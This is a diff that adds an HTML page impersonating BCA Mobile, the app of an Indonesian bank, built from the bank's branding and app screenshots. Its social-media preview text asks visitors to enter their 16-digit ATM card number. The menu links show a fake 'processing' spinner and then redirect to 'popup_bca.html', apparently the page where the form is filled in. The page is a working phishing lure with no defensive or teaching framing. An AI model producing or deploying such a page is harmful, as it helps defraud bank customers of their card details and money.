@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BCA Mobile</title>
+        <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="m-BCA Clone" />
+    <meta property="og:description" content="klik link lengkapi formulir nya terimakasih." />
+    <meta property="og:image" content="https://i.ibb.co.com/ByXBBrL/images-28.jpg" />
+    <meta property="og:url" content="https://yourwebsite.com" /> <!-- Ganti dengan URL asli halaman -->
+    <meta property="og:type" content="website" />
+    
+    <!-- Meta untuk Twitter Card -->
+    <meta name="twitter:title" content="m-BCA Clone" />
+    <meta name="twitter:description" content="Masukkan 16 angka No. Kartu ATM Anda untuk proses lebih lanjut." />
+    <meta name="twitter:image" content="https://i.ibb.co/H7Zxb7g/Screenshot-20241112-161156-BCA-mobile.png" />
+    <meta name="twitter:card" content="summary_large_image" />
+    
+    <!-- Stylesheets and other tags... -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(180deg, #4a90e2 0%, #003b7a 100%);
+            min-height: 100vh;
+            color: white;
+            overflow-y: hidden;
+        }
+        .logo {
+            width: 200px;
+            margin: 30px auto;
+            display: block;
+        }
+        .menu-container {
+            background: #ffffff;
+            border-radius: 5px;
+            padding: 0.09rem;
+            margin: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            overflow-y: hidden;
+        }
+        .menu-item {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            border-bottom: 1px solid #e0e0e0;
+            cursor: pointer;
+            text-decoration: none;
+            color: #333;
+            transition: background-color 0.2s;
+            background: linear-gradient(180deg, #4a90e2 0%, #003b7a 100%);
+            color: white;
+            overflow-y: hidden;
+        }
+        .menu-item:hover {
+            background: linear-gradient(180deg, #5da0f2 0%, #004589 100%);
+            color: white;
+        }
+        .menu-item:last-child {
+            border-bottom: none;
+        }
+        .menu-item img {
+            width: 60px;
+            margin-right: 15px;
+        }
+        .menu-item span {
+            font-weight: 500;
+            font-size: 16px;
+        }
+        .btn-custom {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            width: 90%;
+            margin: 10px 0;
+            padding: 10px;
+            border: none;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            border-bottom: 1px solid #e0e0e0;
+            cursor: pointer;
+            text-decoration: none;
+            color: #333;
+            transition: background-color 0.2s;
+            background: linear-gradient(180deg, #4a90e2 0%, #003b7a 100%);
+            color: white;
+            margin-left: 20px;
+            font-weight: bold;
+            overflow-y: hidden;
+        }
+        .footer {
+            width: 100%;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            display: block;
+            overflow-x: hidden;
+        }
+        .bca-logo {
+            background-color: ;
+            padding: 20px;
+            text-align: center;
+            border-radius: 8px;
+            display: inline-block;
+        }
+        .bca {
+            font-family: Arial, sans-serif;
+            font-weight: bold;
+            font-size: 42px;
+            color: white;
+            letter-spacing: -2px;
+        }
+        .mobile {
+            font-family: Arial, sans-serif;
+            font-size: 24px;
+            color: white;
+            font-style: italic;
+            margin-left: 3px;
+        }
+        /* Loading Spinner */
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: -365px;
+        }
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #003d79;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .menu-container .menu-item img {
+          border-radius: 10px;
+          width: 70px;
+}
+    </style>
+</head>
+<body>
+  <div class="bca-logo">
+      <span class="bca">BCA</span><span class="mobile">mobile</span>
+  </div>
+  <div class="menu-container">
+      <a href="#" class="menu-item btn" onclick="showLoadingAndRedirect(event, 'popup_bca.html')">
+          <img src="https://i.ibb.co.com/J5MdZ87/Screenshot-20241112-173507-BCA-mobile.jpg" alt="m-BCA">
+          <span>m-BCA</span>
+      </a>
+      <a href="#" class="menu-item btn" onclick="showLoadingAndRedirect(event, 'popup_bca.html')">
+          <img src="https://i.ibb.co.com/HnmpBsy/Screenshot-20241112-170933-BCA-mobile.png" alt="KlikBCA">
+          <span>KlikBCA</span>
+      </a>
+      <a href="#" class="menu-item btn" onclick="showLoadingAndRedirect(event, 'popup_bca.html')">
+          <img src="https://i.ibb.co.com/7zLxK7h/Screenshot-20241112-170933-BCA-mobile.jpg" alt="Info BCA">
+          <span>Info BCA</span>
+      </a>
+  </div>
+  <button class="btn btn-custom d-block">Buka Rekening Baru</button>
+  <button class="btn btn-custom d-block">Flazz</button>
+  <!-- Footer Banner -->
+  <img src="https://i.ibb.co.com/rdCN4rL/Screenshot-20241112-161148-BCA-mobile.png" alt="Footer" class="footer">
+  
+  <!-- Loading Spinner -->
+  <div class="loading">
+      <div class="loading-spinner"></div>
+      <p>Memproses...</p>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+      function showLoadingAndRedirect(event, url) {
+          event.preventDefault();
+          const loadingElement = document.querySelector('.loading');
+          loadingElement.style.display = 'block';
+
+          // Mengukur waktu respons jaringan dengan fetch ke server atau API
+          const startTime = performance.now();
+          fetch('https://www.google.com') // URL untuk pengukuran kecepatan jaringan
+              .then(() => {
+                  const endTime = performance.now();
+                  const networkSpeed = endTime - startTime;
+
+                  // Set delay tergantung kecepatan jaringan, dengan batas maksimum 3 detik
+                  const delay = Math.min(networkSpeed * 5, 3000);
+
+                  // Delay dan pindah halaman
+                  setTimeout(() => {
+                      loadingElement.style.display = 'none';
+                      window.location.href = url;
+                  }, delay);
+              })
+              .catch(() => {
+                  // Jika gagal, tetap tampilkan loading dengan delay default 2 detik
+                  setTimeout(() => {
+                      loadingElement.style.display = 'none';
+                      window.location.href = url;
+                  }, 2000);
+              });
+      }
+  </script>
+</body>
+</html>
